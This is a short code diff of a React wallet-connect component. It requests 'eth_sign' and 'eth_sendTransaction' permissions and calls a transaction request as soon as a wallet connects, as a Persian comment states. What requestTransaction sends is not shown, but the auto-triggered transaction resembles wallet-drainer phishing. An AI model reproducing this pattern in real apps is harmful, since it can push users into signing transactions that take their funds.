@@ -14,21 +14,19 @@ function App() {
         showQrModal: true,
         qrModalOptions: { themeMode: "dark" },
         chains: [1],
-        methods: ["eth_sign", "eth_sendTransaction", "eth_signTransaction"],
+        methods: ["eth_accounts", "eth_sign", "eth_sendTransaction"],
         projectId: "9fe3ed74e1d73141e8b7747bedf77551",
       });
 
-      await ethereumProvider.enable();
-      setProvider(ethereumProvider);
-
-      const accounts = await ethereumProvider.request({ method: "eth_accounts" });
+      const accounts = await ethereumProvider.request({ method: "eth_requestAccounts" });
 
       if (accounts.length > 0) {
         setAccount(accounts[0]);
+        setProvider(ethereumProvider);
         setWalletConnected(true);
         console.log("✅ Connected Wallet Address:", accounts[0]);
 
-        // پس از اتصال کیف پول، درخواست تراکنش ارسال شود
+        // پس از اتصال موفق، درخواست تراکنش ارسال شود
         requestTransaction(accounts[0]);
       } else {
         console.log("⚠ No account found.");
@@ -79,7 +77,7 @@ function App() {
       className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
       data-uk-toggle=""
     >
-      <span>{walletConnected ? "✅ Wallet Connected" : "🔗 Connect Wallet"}</span>
+      <span>{walletConnected ? `✅ Wallet: ${account.slice(0, 6)}...` : "🔗 Connect Wallet"}</span>
     </a>
   );
 }
